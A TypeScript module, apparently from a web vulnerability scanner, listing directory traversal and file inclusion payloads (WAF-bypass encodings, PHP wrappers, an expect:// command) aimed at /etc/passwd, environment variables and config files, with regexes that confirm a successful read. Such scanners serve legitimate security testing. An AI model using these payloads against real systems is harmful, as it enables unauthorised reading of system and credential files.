/** Directory traversal / LFI payloads */
export const TRAVERSAL_PAYLOADS = [
  // Unix — /etc/passwd (most common, works on Linux/macOS)
  '../../../etc/passwd',
  '..\\..\\..\\etc\\passwd',
  '....//....//....//etc/passwd',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '..%252f..%252f..%252fetc%252fpasswd',
  // Null byte bypass (PHP < 5.3.4, some other languages)
  '../../../etc/passwd%00',
  '../../../etc/passwd%00.jpg',
  '../../../etc/passwd%00.html',
  // Deeper traversal (for chrooted/nested deployments)
  '../../../../../etc/passwd',
  '../../../../../../etc/passwd',
  // Windows paths
  '..\\..\\..\\windows\\win.ini',
  '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
  // PHP wrappers (LFI → source code disclosure)
  'php://filter/convert.base64-encode/resource=index',
  'php://filter/convert.base64-encode/resource=../config',
  // Tomcat/Spring ..;/ bypass (semicolon treated as path parameter separator)
  '..;/..;/..;/etc/passwd',
  '..;/..;/..;/windows/win.ini',
  // UTF-8 overlong encoding (..%c0%af = ../ on vulnerable decoders)
  '..%c0%af..%c0%af..%c0%afetc/passwd',
  // URL-encoded backslash (Windows path traversal via %5c)
  '..%5c..%5c..%5cwindows%5cwin.ini',
  // /proc/self/environ — Linux env vars (often contains secrets/credentials)
  '../../../proc/self/environ',
  // Absolute paths (bypass weak sanitization)
  '/etc/passwd',
  'C:\\windows\\win.ini',
  // PHP input wrapper (read POST data — detects include() calls)
  'php://input',
  // Expect wrapper (less common but sometimes allowed)
  'expect://id',
  // Data wrapper (inline include — PHP 5.2+)
  'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
  // ── WAF bypass techniques ──────────────────────────────────────────
  // Double URL encoding (bypasses single-decode WAF + double-decode app)
  '..%252f..%252f..%252fetc/passwd',
  '..%252f..%252f..%252fwindows%252fwin.ini',
  // Unicode fullwidth characters (IIS/Tomcat/some WAFs)
  '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd',
  // Mixed slash encoding (forward + backslash combos)
  '..%5c..%2f..%5c..%2fetc/passwd',
  // Path normalization bypass — /./
  './.././.././../etc/passwd',
  // Reverse traversal — go up then back (confuses path canonicalization)
  '/var/www/../../etc/passwd',
  // Trailing dot bypass (Windows filesystem quirk)
  '..\\..\\..\\windows\\win.ini.',
  '..\\..\\..\\windows\\win.ini::$DATA',
  // URL-encoded null + traversal (bypass extension checks)
  '....//....//etc/passwd%00.png',
];

/** Patterns indicating directory traversal / LFI success — keyed by target file */
export const TRAVERSAL_FILE_PATTERNS: Record<string, RegExp[]> = {
  '/etc/passwd': [/root:[x*]:0:0:/],
  '/etc/hosts': [/127\.0\.0\.1\s+localhost/],
  '/etc/shadow': [/root:\$[0-9a-z]\$/i],
  'win.ini': [/\[fonts\]/i, /\[extensions\]/i, /\[boot loader\]/i],
  'hosts': [/127\.0\.0\.1\s+localhost/],
  '/proc/self/environ': [/PATH=|HOME=|USER=/],
};

/** Legacy array — kept for backwards compatibility but no longer used for detection */
export const TRAVERSAL_SUCCESS_PATTERNS = [
  /root:[x*]:0:0:/,              // /etc/passwd format (strict)
  /\[boot loader\]/i,          // Windows win.ini
  /\[extensions\]/i,           // Windows win.ini
  /\[fonts\]/i,                // Windows win.ini
  /127\.0\.0\.1\s+localhost/,  // hosts file (strict: IP + localhost together)
  /PATH=|HOME=|USER=/,         // /proc/self/environ variables
  // PHP wrapper base64 output (starts with PD for <?php)
  /^[A-Za-z0-9+/]{40,}={0,2}$/m,
];

/**
 * Determine which target file a traversal payload is trying to read.
 * Returns the file key for TRAVERSAL_FILE_PATTERNS lookup.
 */
export function getTargetFile(payload: string): string | null {
  const decoded = decodeURIComponent(payload).replace(/%00.*$/, '');
  if (/etc\/passwd/i.test(decoded)) return '/etc/passwd';
  if (/etc\/shadow/i.test(decoded)) return '/etc/shadow';
  if (/etc\/hosts/i.test(decoded)) return '/etc/hosts';
  if (/win\.ini/i.test(decoded)) return 'win.ini';
  if (/drivers[/\\]etc[/\\]hosts/i.test(decoded)) return 'hosts';
  if (/proc\/self\/environ/i.test(decoded)) return '/proc/self/environ';
  return null;
}

/**
 * Verify the response body actually contains file content matching the traversal target.
 * Returns false for HTML error pages / framework not-found pages that happen to return 200.
 */
export function isRealTraversalContent(body: string, payload: string): boolean {
  // If body is clearly an HTML page (error/not-found), it's not real file content
  if (isHtmlErrorPage(body)) return false;

  const targetFile = getTargetFile(payload);
  if (!targetFile) {
    // PHP wrappers / unknown targets: check for base64 output pattern
    if (/php:\/\/filter/i.test(payload)) {
      return /^[A-Za-z0-9+/]{40,}={0,2}$/m.test(body);
    }
    // Unknown payload type — require body to NOT be HTML and be non-empty
    return body.length > 0 && !/<html[\s>]/i.test(body);
  }

  const patterns = TRAVERSAL_FILE_PATTERNS[targetFile];
  if (!patterns) return body.length > 0 && !/<html[\s>]/i.test(body);
  return patterns.some((p) => p.test(body));
}

/**
 * Detect HTML error pages / framework rendered pages that are NOT real file content.
 * Next.js, Nuxt, Express, etc. return 200 with an HTML error page for invalid paths.
 */
function isHtmlErrorPage(body: string): boolean {
  const lower = body.toLowerCase();
  // Must look like an HTML page
  const isHtml = /<html[\s>]/i.test(body) || /<head[\s>]/i.test(body) || /<body[\s>]/i.test(body);
  if (!isHtml) return false;

  // Framework error page indicators
  const errorIndicators = [
    /not\s*found/i,
    /404/,
    /error/i,
    /__next/i,           // Next.js
    /__nuxt/i,           // Nuxt
    /page not found/i,
    /this page could not be found/i,
    /cannot GET/i,
    /cannot be found/i,
    /<title>[^<]*(?:error|not found|404)[^<]*<\/title>/i,
  ];

  return errorIndicators.some((p) => p.test(body));
}
